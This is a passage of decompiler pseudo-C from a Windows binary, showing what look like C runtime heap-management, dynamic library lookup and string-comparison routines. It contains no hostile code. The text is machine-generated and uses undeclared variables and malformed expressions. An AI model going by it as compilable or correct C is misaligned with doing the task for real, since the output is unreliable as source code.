			Mem291[edi_364 + 0x04 + eax_18:byte] = cl_285 + 0x01;
			if (edi_364 < 0x20)
			{
				if (cl_285 == 0x00)
					*dwArg04 = *dwArg04 | 0x80000000 >> (byte) edi_364;
				word32 eax_307 = eax_18 + 0x44 + (esi_20 >>u 0x0F) * 0x04;
				*eax_307 = *eax_307 | 0x80000000 >> (byte) edi_364;
			}
			else
			{
				if (cl_285 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) | 0x80000000 >> (byte) (edi_364 - (union Eq_10742 *) 0x20);
				word32 eax_328 = eax_18 + 0xC4 + (esi_20 >>u 0x0F) * 0x04;
				*eax_328 = *eax_328 | 0x80000000 >> (byte) (edi_364 - (union Eq_10742 *) 0x20);
			}
			ebx_30 = dwLoc10_33;
		}
	}
	*edx_22 = ebx_30;
	edx_22[(ebx_30 - 0x04) / 0x0C] = (struct Eq_10605) ebx_30;
	word32 v31_91 = *ecx_32 - 0x01;
	*ecx_32 = v31_91;
	if (v31_91 != 0x00)
		return;
	Eq_2 eax_141;
	Eq_2 eax_125 = globals->t493AD8;
	if (eax_125 != 0x00)
	{
		VirtualFree((word32) *((word32) eax_125 + 0x0C) + (globals->t493AD0 << 0x0F), 0x8000, 0x4000);
		Eq_2 eax_179 = globals->t493AD8;
		*((word32) eax_179 + 0x08) = *((word32) eax_179 + 0x08) | 0x80000000 >> (byte) globals->t493AD0;
		Eq_10607 ecx_186 = globals->t493AD0;
		Eq_10594 eax_187 = *((word32) globals->t493AD8 + 0x0010);
		*((word32) eax_187 + (ecx_186 * 0x04 + 0x00C4)) = *((word32) eax_187 + (ecx_186 * 0x04 + 0x00C4)) & 0x00;
		Eq_10594 eax_192 = *((word32) globals->t493AD8 + 0x0010);
		*((word32) eax_192 + 0x0043) = *((word32) eax_192 + 0x0043) - 0x01;
		Eq_2 eax_195 = globals->t493AD8;
		if (*((word32) *((word32) eax_195 + 0x0010) + 0x0043) == 0x00)
		{
			*((word32) eax_195 + 0x04) = *((word32) eax_195 + 0x04) & ~0x01;
			eax_195 = globals->t493AD8;
		}
		if (*((word32) eax_195 + 0x08) == ~0x00)
		{
			VirtualFree(esp_209->t0000, esp_209->t0004, esp_209->t0008);
			*(esp_211 - 0x04) = (union Eq_10594 *) *((word32) globals->t493AD8 + 0x0010);
			*(esp_211 - 0x08) = 0x00;
			*(esp_211 - 0x0C) = (union Eq_2 *) globals->t494B04;
			HeapFree(*(esp_211 - 0x0C), *(esp_211 - 0x08), *(esp_211 - 0x04));
			Eq_2 eax_240 = globals->t493AD8;
			*(esp_211 - 0x10) = (word32) globals->t493AE0 + ((globals->dw493ADC * 0x14 - eax_240) - 0x14);
			*(esp_211 - 0x14) = (word32) eax_240 + 0x0014;
			*(esp_211 - 0x18) = (union Eq_2 *) eax_240;
			eax_141 = fn00407FE0(dwArg00, dwArg04, dwArg08_356, out esi_145)->t0008;
			globals->dw493ADC = globals->dw493ADC - 0x01;
			if (eax_141 > globals->t493AD8)
				eax_141 = eax_141 - 0x14;
			globals->t493AD4 = globals->t493AE0;
l0040B8F9:
			globals->t493AD8 = eax_141;
			globals->t493AD0 = esi_145;
			return;
		}
	}
	eax_141 = dwArg04;
	goto l0040B8F9;
}

// 0040B909: Register ptr32 fn0040B909(Register Eq_3320 ebp, Register uint32 esi, Stack uint32 dwArg04, Stack byte bArg07, Register out Eq_7798 blOut)
ptr32 fn0040B909(LPCH ebp, uint32 esi, uint32 dwArg04, byte bArg07, Eq_7798 & blOut)
{
	uint32 esi_363;
	uint32 dwLoc0C_33;
	uint32 dwLoc10_32;
	int32 ecx_25 = dwArg04 + 0x17 & ~0x0F;
	Eq_2 edx_9 = globals->t493AE0;
	int32 ecx_28 = (ecx_25 >> 0x04) - 0x01;
	Eq_2 edi_20 = (word32) edx_9 + (globals->dw493ADC * 0x05) * 0x04;
	byte cl_29 = (byte) ecx_28;
	if (ecx_28 < 0x20)
	{
		esi_363 = (esi | ~0x00) >> cl_29;
		dwLoc0C_33 = dwLoc0C | ~0x00;
		dwLoc10_32 = esi_363;
	}
	else
	{
		esi_363 = 0x00;
		dwLoc10_32 = 0x00;
		dwLoc0C_33 = (dwArg04 | ~0x00) >> (byte) (ecx_28 + ~0x1F);
	}
	Eq_2 eax_38 = globals->t493AD4;
	Eq_2 ebx_144 = eax_38;
	Eq_2 dwArg04_405 = eax_38;
	if (eax_38 < edi_20)
	{
		while ((*((word32) ebx_144 + 0x04) & dwLoc0C_33 | *ebx_144 & esi_363) == 0x00)
		{
			ebx_144 = (word32) ebx_144 + 0x0014;
			dwArg04_405 = ebx_144;
			if (ebx_144 >= edi_20)
				break;
		}
	}
	ptr32 eax_165;
	if (ebx_144 == edi_20)
	{
		ebx_144 = edx_9;
		while (true)
		{
			bool Z_403 = cond(ebx_144 - eax_38);
			dwArg04_405 = ebx_144;
			if (ebx_144 >= eax_38)
				break;
			if ((*((word32) ebx_144 + 0x04) & dwLoc0C_33 | *ebx_144 & esi_363) != 0x00)
			{
				Z_403 = cond(ebx_144 - eax_38);
				break;
			}
			ebx_144 = (word32) ebx_144 + 0x0014;
		}
		if (!Z_403)
		{
			while (true)
			{
				bool Z_419 = cond(ebx_144 - edi_20);
				if (ebx_144 >= edi_20)
					break;
				if (*((word32) ebx_144 + 0x08) != 0x00)
				{
					Z_419 = cond(ebx_144 - edi_20);
					break;
				}
				ebx_144 = (word32) ebx_144 + 0x0014;
				dwArg04_405 = ebx_144;
			}
			if (!Z_419)
			{
				ebx_144 = (word32) edx_9 + 0x08;
				while (true)
				{
					bool Z_464 = cond(ebx_144 - eax_38);
					dwArg04_405 = ebx_144;
					if (ebx_144 >= eax_38)
						break;
					if (*ebx_144 != 0x00)
					{
						Z_464 = cond(ebx_144 - eax_38);
						break;
					}
					ebx_144 = (word32) ebx_144 + 0x0014;
				}
				if (!Z_464)
				{
					Eq_2 eax_472 = fn0040BC12();
					ebx_144 = eax_472;
					dwArg04_405 = eax_472;
					if (eax_472 == 0x00)
					{
l0040B9F7:
						eax_165 = 0x00;
						goto l0040BC0D;
					}
				}
			}
			*(fp - 0x28) = (union Eq_2 *) ebx_144;
			*(word32 **) 0x1010 = fn0040BCC3(dwArg00, out ebx_144, out esi_363);
			if (*(word32 **) 0x1010 == ~0x00)
				goto l0040B9F7;
		}
	}
	globals->t493AD4 = ebx_144;
	struct Eq_11310 * eax_90 = *((word32) ebx_144 + 0x0010);
	Eq_10607 edx_371 = eax_90->t0000;
	Eq_10607 dwLoc08_355 = edx_371;
	if (edx_371 == ~0x00 || ((eax_90->a00C4)[edx_371] & dwLoc0C_33 | (eax_90->a0044)[edx_371] & esi_363) == 0x00)
	{
		dwLoc08_355 = edx_371 & 0x00;
		ui32 * ecx_357 = eax_90->a0044 + 33;
		esi_363 = dwLoc10_32;
		if ((eax_90->a00C4[0x00] & dwLoc0C_33 | (eax_90->a0044)[0x00] & dwLoc10_32) == 0x00)
		{
			do
			{
				ecx_357 = ecx_550 + 0x01;
				dwLoc08_355 = (word32) dwLoc08_355 + 0x01;
				ui32 * ecx_550 = ecx_357;
			} while ((*ecx_550 & dwLoc0C_33 | dwLoc10_32 & *ecx_357) == 0x00);
		}
		edx_371 = dwLoc08_355;
	}
	int32 edi_111 = 0x00;
	struct Eq_11375 * ecx_101 = eax_90 + (edx_371 *s 0x0204 + 0x0144) / 0x00C4;
	int32 ecx_104 = eax_90->a0044[edx_371] & esi_363;
	if (ecx_104 == 0x00)
	{
		ui32 ecx_340 = eax_90->a00C4[edx_371];
		*(fp - 0x28) = 0x20;
		ecx_104 = ecx_340 & dwLoc0C_33;
		edi_111 = *(fp - 0x28);
	}
	while (ecx_104 >= 0x00)
	{
		ecx_104 = ecx_104 << 0x01;
		edi_111 = edi_111 + 0x01;
	}
	struct Eq_11439 * edx_123 = ecx_101->a0004[edi_111].ptr0000;
	int32 ecx_125 = *edx_123 - ecx_25;
	int32 esi_130 = (ecx_125 >> 0x04) - 0x01;
	if (esi_130 > 0x3F)
	{
		*(fp - 0x28) = 0x3F;
		esi_130 = *(fp - 0x28);
	}
	if (esi_130 == edi_111)
	{
l0040BBC0:
		if (ecx_125 != 0x00)
		{
			*edx_123 = ecx_125;
			edx_123[(ecx_125 - 0x04) / 0x0C] = (struct Eq_11439) ecx_125;
		}
		goto l0040BBCF;
	}
	if (edx_123->ptr0004 == edx_123->ptr0008)
	{
		if (edi_111 < 0x20)
		{
			uint32 ebx_296 = ~(0x80000000 >> (byte) edi_111);
			eax_90->a0044[dwLoc08_355] = ebx_296 & (eax_90->a0044)[dwLoc08_355];
			byte * edi_295 = (char *) &eax_90->t0000 + 0x04 + edi_111;
			byte v19_301 = *edi_295 - 0x01;
			*edi_295 = v19_301;
			if (v19_301 == 0x00)
			{
				*dwArg04_405 = *dwArg04_405 & ebx_296;
				ebx_144 = dwArg04_405;
				goto l0040BB1C;
			}
l0040BB19:
			ebx_144 = dwArg04_405;
			goto l0040BB1C;
		}
		ui32 * ecx_318 = eax_90->a00C4 + dwLoc08_355;
		uint32 ebx_319 = ~(0x80000000 >> (byte) (edi_111 - 0x20));
		*ecx_318 = *ecx_318 & ebx_319;
		byte * edi_317 = (char *) &eax_90->t0000 + 0x04 + edi_111;
		byte v22_324 = *edi_317 - 0x01;
		*edi_317 = v22_324;
		if (v22_324 != 0x00)
			goto l0040BB19;
		*((word32) dwArg04_405 + 0x04) = *((word32) dwArg04_405 + 0x04) & ebx_319;
		ebx_144 = dwArg04_405;
	}
l0040BB1C:
	edx_123->ptr0008->ptr0004 = edx_123->ptr0004;
	edx_123->ptr0004->ptr0008 = edx_123->ptr0008;
	if (ecx_125 == 0x00)
	{
l0040BBCF:
		word32 * edx_148 = edx_123 + ecx_125 / 0x0C;
		*edx_148 = ecx_25 + 0x01;
		(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(edx_148 - 0x04)[ecx_25].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00] = ecx_25 + 0x01;
		word32 ecx_153 = ecx_101->dw0000;
		ecx_101->dw0000 = ecx_153 + 0x01;
		if (ecx_153 == 0x00 && (ebx_144 == globals->t493AD8 && dwLoc08_355 == globals->t493AD0))
			globals->t493AD8 = globals->t493AD8 & 0x00;
		eax_90->t0000 = dwLoc08_355;
		eax_165 = edx_148 + 0x01;
l0040BC0D:
		byte bl_74;
		*blOut = (byte) *(fp - 0x1C);
		return eax_165;
	}
	edx_123->ptr0004 = ecx_101->a0004[esi_130].ptr0000;
	struct Eq_11439 * ecx_210 = ecx_101 + esi_130 * 0x02;
	edx_123->ptr0008 = ecx_210;
	ecx_210->ptr0004 = edx_123;
	edx_123->ptr0004->ptr0008 = edx_123;
	if (edx_123->ptr0004 == edx_123->ptr0008)
	{
		byte cl_229 = eax_90[(esi_130 + 0x04) / 0x00C4];
		if (esi_130 < 0x20)
		{
			eax_90[(esi_130 + 0x04) / 0x00C4] = (struct Eq_11310) (cl_229 + 0x01);
			if (cl_229 == 0x00)
				*ebx_144 = *ebx_144 | 0x80000000 >> (byte) esi_130;
			eax_90->a0044[dwLoc08_355] = eax_90->a0044[dwLoc08_355] | 0x80000000 >> (byte) esi_130;
		}
		else
		{
			eax_90[(esi_130 + 0x04) / 0x00C4] = (struct Eq_11310) (cl_229 + 0x01);
			if (cl_229 == 0x00)
				*((word32) ebx_144 + 0x04) = *((word32) ebx_144 + 0x04) | 0x80000000 >> (byte) (esi_130 - 0x20);
			ui32 * edi_260 = eax_90->a00C4 + dwLoc08_355;
			*edi_260 = *edi_260 | 0x80000000 >> (byte) (esi_130 - 0x20);
		}
	}
	goto l0040BBC0;
}

// 0040BC12: Register (ptr Eq_11793) fn0040BC12()
Eq_11793 * fn0040BC12()
{
	struct Eq_11793 * eax_25;
	ui32 eax_118 = globals->dw493ADC;
	ui32 ecx_4 = globals->dw493ACC;
	ptr32 esp_109 = fp - 0x08;
	if (eax_118 == ecx_4)
	{
		esp_109 = fp - 0x18;
		Eq_2 eax_111 = HeapReAlloc(globals->t494B04, 0x00, globals->t493AE0, ecx_4 + 0x50 + ecx_4 * 0x04 << 0x02);
		if (eax_111 == 0x00)
		{
l0040BCA5:
			eax_25 = null;
			return eax_25;
		}
		globals->dw493ACC = globals->dw493ACC + 0x10;
		globals->t493AE0 = eax_111;
		eax_118 = globals->dw493ADC;
	}
	Eq_2 ecx_51 = globals->t493AE0;
	SIZE_T * esp_52 = esp_109 - 0x04;
	*esp_52 = (uint32) 0x41C4;
	*(esp_52 - 0x04) = 0x08;
	*(esp_52 - 0x08) = (union Eq_2 *) globals->t494B04;
	struct Eq_11793 * esi_60 = (word32) ecx_51 + (eax_118 * 0x05) * 0x04;
	Eq_2 eax_61 = HeapAlloc(*(esp_52 - 0x08), *(esp_52 - 0x04), *esp_52);
	esi_60->t0010 = eax_61;
	if (eax_61 != 0x00)
	{
		*(esp_52 - 0x0C) = 0x04;
		*(esp_52 - 0x10) = 0x2000;
		*(esp_52 - 0x14) = 0x00100000;
		*(esp_52 - 0x18) = 0x00;
		Eq_2 eax_73 = VirtualAlloc(*(esp_52 - 0x18), *(esp_52 - 0x14), *(esp_52 - 0x10), *(esp_52 - 0x0C));
		esi_60->t000C = eax_73;
		if (eax_73 != 0x00)
		{
			esi_60->dw0008 = esi_60->dw0008 | ~0x00;
			esi_60->dw0000 = 0x00;
			esi_60->dw0004 = 0x00;
			globals->dw493ADC = globals->dw493ADC + 0x01;
			Eq_2 eax_93 = esi_60->t0010;
			*eax_93 = *eax_93 | ~0x00;
			eax_25 = esi_60;
			return eax_25;
		}
		*(esp_52 - 0x1C) = (union Eq_2 *) esi_60->t0010;
		*(esp_52 - 0x20) = 0x00;
		*(esp_52 - 0x24) = (union Eq_2 *) globals->t494B04;
		HeapFree(*(esp_52 - 0x24), *(esp_52 - 0x20), *(esp_52 - 0x1C));
	}
	goto l0040BCA5;
}

// 0040BCC3: Register int32 fn0040BCC3(Stack (ptr Eq_11479) dwArg04, Register out (ptr Eq_11480) ebxOut, Register out Eq_11481 esiOut)
int32 fn0040BCC3(Eq_11479 * dwArg04, Eq_11480 * & ebxOut, Eq_11481 & esiOut)
{
	struct Eq_12016 * esi_22 = dwArg04->ptr0010;
	int32 eax_23 = dwArg04->dw0008;
	int32 ebx_25 = 0x00;
	while (eax_23 >= 0x00)
	{
		eax_23 = eax_23 << 0x01;
		ebx_25 = ebx_25 + 0x01;
	}
	word32 edx_46 = 0x3F;
	struct Eq_12028 * eax_48 = esi_22 + (ebx_25 *s 0x0204 + 0x0144) / 0x00C4;
	eax_52 = eax_48;
	do
	{
		struct Eq_12028 * eax_52;
		eax_52[0x01] = (struct Eq_12028) eax_52;
		eax_52->dw0004 = eax_52;
		eax_52 = eax_52 + 0x01;
		edx_46 = edx_46 - 0x01;
	} while (edx_46 != 0x00);
	int32 eax_143;
	Eq_2 edi_65 = (ebx_25 << 0x0F) + dwArg04->dw000C;
	Eq_2 eax_72 = VirtualAlloc(edi_65, 0x8000, 0x1000, 0x04);
	if (eax_72 == 0x00)
		eax_143 = eax_72 | ~0x00;
	else
	{
		if (edi_65 <=u edi_65 + 0x7000)
		{
			word32 eax_149 = edi_65 + 0x10;
			do
			{
				*(eax_149 - 0x08) = *(eax_149 - 0x08) | ~0x00;
				*((word32) eax_149 + 0x0FEC) = *((word32) eax_149 + 0x0FEC) | ~0x00;
				*(eax_149 - 0x04) = 0x0FF0;
				Mem160[eax_149 + 0x00:word32] = eax_149 + 0x0FFC;
				Mem162[eax_149 + 0x04:word32] = eax_149 + ~0x1003;
				*((word32) eax_149 + 0x0FE8) = 0x0FF0;
				eax_149 = eax_149 + 0x1000;
			} while (eax_149 - 0x10 <=u edi_65 + 0x7000);
		}
		Mem116[eax_48 + 0x01FC:word32] = edi_65 + 0x0C;
		*((word32) edi_65 + 0x0014) = eax_48 + 0x003F;
		Mem119[eax_48 + 0x0200:word32] = edi_65 + 0x700C;
		*((word32) edi_65 + 28688) = eax_48 + 0x003F;
		esi_22->a0044[ebx_25] = esi_22->a0044[ebx_25] & 0x00;
		esi_22->a00C4[ebx_25] = 0x01;
		byte al_125 = esi_22->b0043;
		esi_22->b0043 = al_125 + 0x01;
		if (al_125 == 0x00)
			dwArg04->dw0004 = dwArg04->dw0004 | 0x01;
		dwArg04->dw0008 = dwArg04->dw0008 & ~(0x80000000 >> (byte) ebx_25);
		eax_143 = ebx_25;
	}
	word32 esi_90;
	*esiOut = 0x8000;
	word32 ebx_92;
	ebxOut->u0 = 0x1000;
	return eax_143;
}

// 0040BDBE: Register word32 fn0040BDBE(Stack uint32 dwArg04)
word32 fn0040BDBE(uint32 dwArg04)
{
	<anonymous> * eax_3 = globals->ptr493ABC;
	if (eax_3 != null)
	{
		word32 * esp_27;
		word32 eax_28;
		byte SZO_29;
		byte C_30;
		byte Z_31;
		word32 ecx_32;
		eax_3();
		if (eax_28 != 0x00)
		{
			*esp_27 = 0x01;
			return *esp_27;
		}
	}
	return 0x00;
}

// 0040C056: Register word32 fn0040C056(Stack word32 dwArg04)
word32 fn0040C056(word32 dwArg04)
{
	return fn0040C067((byte) dwArg04, 0x00, 0x04);
}

// 0040C067: Register ui32 fn0040C067(Stack byte bArg04, Stack ui32 dwArg08, Stack byte bArg0C)
ui32 fn0040C067(byte bArg04, ui32 dwArg08, byte bArg0C)
{
	struct Eq_12227 * eax_3 = (word32) bArg04;
	if ((eax_3->b494D61 & bArg0C) == 0x00)
	{
		ui32 eax_29;
		if (dwArg08 != 0x00)
			eax_29 = (word32) globals->a412A1A[eax_3 * 0x02] & dwArg08;
		else
			eax_29 = 0x00;
		if (eax_29 == 0x00)
			return eax_29;
	}
	return 0x01;
}

// 0040C098: Register byte fn0040C098()
byte fn0040C098()
{
	struct Eq_12249 * esp_114;
	word32 ebx_112 = 0x00;
	struct Eq_12252 * esp_102 = fp - 0x0C;
	if (globals->t493AC0 != null)
	{
l0040C0E7:
		Eq_2138 eax_54 = globals->t493AC4;
		if (eax_54 != null)
		{
			word32 ebx_82;
			byte SZO_83;
			byte C_84;
			byte SCZO_85;
			word32 esi_86;
			word32 edi_87;
			byte Z_88;
			word32 eax_89;
			byte bl_90;
			eax_54();
			ebx_112 = eax_89;
			if (eax_89 != 0x00)
			{
				Eq_2138 eax_96 = globals->t493AC8;
				if (eax_96 != null)
				{
					*(esp_102 - 0x04) = eax_89;
					word32 ebx_103;
					byte SZO_104;
					byte C_105;
					byte SCZO_106;
					word32 esi_107;
					word32 edi_108;
					byte Z_109;
					word32 eax_110;
					byte bl_111;
					eax_96();
					ebx_112 = eax_110;
				}
			}
		}
		struct Eq_12295 * esp_61 = esp_102 - 0x04;
		esp_61->dw0000 = esp_102->dw0018;
		*(esp_61 - 0x04) = esp_61->dw0018;
		*(esp_61 - 0x08) = esp_61->dw0014;
		*(esp_61 - 0x0C) = ebx_112;
		word32 ebx_72;
		byte SZO_73;
		byte C_74;
		byte SCZO_75;
		word32 esi_76;
		word32 edi_77;
		byte Z_78;
		word32 eax_79;
		byte bl_80;
		globals->t493AC0();
		return (byte) esp_114->dw0008;
	}
	else
	{
		esp_114 = fp - 0x10;
		Eq_2485 eax_116 = LoadLibraryA(0x0040D614);
		if (eax_116 != null)
		{
			Eq_2138 eax_133 = GetProcAddress(eax_116, 0x0040D608);
			globals->t493AC0 = eax_133;
			esp_114 = fp - 0x18;
			if (eax_133 != null)
			{
				globals->t493AC4 = GetProcAddress(eax_116, 4249080);
				globals->t493AC8 = GetProcAddress(eax_116, 0x0040D5E4);
				esp_102 = fp - 0x28;
				goto l0040C0E7;
			}
		}
		return (byte) esp_114->dw0008;
	}
}

// 0040C920: Register int32 fn0040C920(Register Eq_2 ecx, Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
int32 fn0040C920(Eq_2 ecx, Eq_2 dwArg04, Eq_2 dwArg08)
{
	int32 eax_140;
	Eq_2 esi_136 = dwArg08;
	if (globals->t49393C == 0x00)
	{
		cu8 al_106 = ~0x00;
		Eq_2 edi_49 = dwArg04;
		do
		{
			cu8 al_115 = al_106;
			if (al_106 == 0x00)
				goto l0040C96E;
			al_106 = (cu8) *esi_136;
			esi_136 = (word32) esi_136 + 0x01;
			cu8 ah_85 = *edi_49;
			edi_49 = (word32) edi_49 + 0x01;
			if (ah_85 == al_106)
				continue;
			cu8 al_105 = ah_85 - 0x41 + (0x00 - (ah_85 < 0x5B) & 0x20);
			cu8 al_95 = al_106 - 0x41 + (0x00 - (al_106 < 0x5B) & 0x20);
			al_106 = al_105 + 0x41;
		} while (al_105 + 0x41 == al_95 + 0x41);
		cu8 al_112 = 0x00 - (al_105 + 0x41 < al_95 + 0x41);
		al_115 = al_112 - ~0x00 - (al_112 < 0x00);
l0040C96E:
		eax_140 = (int32) al_115;
	}
	else
	{
		Eq_5408 eax_118 = 0xFF;
		cu8 al_119 = ~0x00;
		Eq_5408 ebx_120 = 0x00;
		Eq_2 edi_123 = dwArg04;
		do
		{
			eax_140 = (int32) DPB(eax_182, al_119, 0);
			if (al_119 == 0x00)
				return eax_140;
			al_119 = (cu8) *esi_136;
			cu8 bl_147 = *edi_123;
			eax_118 = DPB(eax_182, al_119, 0);
			esi_136 = (word32) esi_136 + 0x01;
			ebx_120 = DPB(ebx_120, bl_147, 0);
			edi_123 = (word32) edi_123 + 0x01;
			Eq_5408 eax_182 = eax_118;
			if (al_119 == bl_147)
				continue;
			Eq_2 ecx_160;
			cu8 al_161 = fn00407ACE(ecx, ebx_120, SLICE(ebx_120, byte, 8), SLICE(ebx_120, byte, 16), out ecx_160);
			al_119 = fn00407ACE(ecx_160, eax_118, SLICE(eax_118, byte, 8), SLICE(eax_118, byte, 16), out ecx);
			ebx_120 = DPB(eax_182, al_161, 0);
			eax_118 = DPB(eax_182, al_119, 0);
		} while (al_161 == al_119);
		uint32 eax_175 = 0x00 - (al_161 < al_119);
		eax_140 = eax_175 - ~0x00 - (eax_175 < 0x00);
	}
	return eax_140;
}

// 0040C9AC: void fn0040C9AC(Register ptr32 ebp, Stack Eq_2 dwArg04)
void fn0040C9AC(ptr32 ebp, Eq_2 dwArg04)
{
	Eq_2 eax_10 = globals->t49393C;
	struct Eq_8279 * dwLoc08_118 = null;
	if (eax_10 == 0x00)
	{
		Eq_2 edx_50 = dwArg04;
		if (*dwArg04 != 0x00)
		{
			do
			{
				ci8 cl_74 = *edx_50;
				if (cl_74 >= 0x41 && cl_74 <= 0x5A)
					*edx_50 = cl_74 + 0x20;
				edx_50 = (word32) edx_50 + 0x01;
			} while (*edx_50 != 0x00);
		}
	}
	else
	{
		word32 ecx_111;
		Eq_2 eax_112 = fn00408A01(fp - 0x04, eax_10, 0x0100, 0x01, dwArg04, ~0x00, 0x00, null, 0x00, 0x01, out ecx_111);
		if (eax_112 != 0x00)
		{
			struct Eq_8279 * ebx_141;
			word32 esi_142;
			word32 edi_143;
			struct Eq_8279 * eax_144 = fn00409613(fp - 0x04, eax_112, out ebx_141, out esi_142, out edi_143);
			dwLoc08_118 = eax_144;
			if (eax_144 != ebx_141)
			{
				*(fp - 0x18) = 0x01;
				*(fp - 0x1C) = (struct Eq_8279 **) ebx_141;
				*(fp - 0x20) = edi_143;
				*(fp - 0x24) = (struct Eq_8279 **) eax_144;
				*(fp - 0x28) = ~0x00;
				*(fp - 44) = (union Eq_2 *) dwArg04;
				*(fp - 0x30) = esi_142;
				*(fp - 0x34) = (union Eq_2 *) globals->t49393C;
				word32 ecx_175;
				if (fn00408A01(fp - 0x04, dwArg00, dwArg04, bArg05, dwArg08, dwArg0C, dwArg10, dwArg14, dwArg18, dwArg1C, out ecx_175) != 0x00)
				{
					*(fp - 0x18) = (struct Eq_8279 **) eax_144;
					*(fp - 0x1C) = (union Eq_2 *) dwArg04;
					fn00407750(dwArg00);
				}
			}
		}
		*(fp - 0x18) = (struct Eq_8279 **) dwLoc08_118;
		word32 ebp_128;
		word32 edi_129;
		fn004095E4(fp - 0x04, dwArg00, out ebp_128, out edi_129);
	}
}

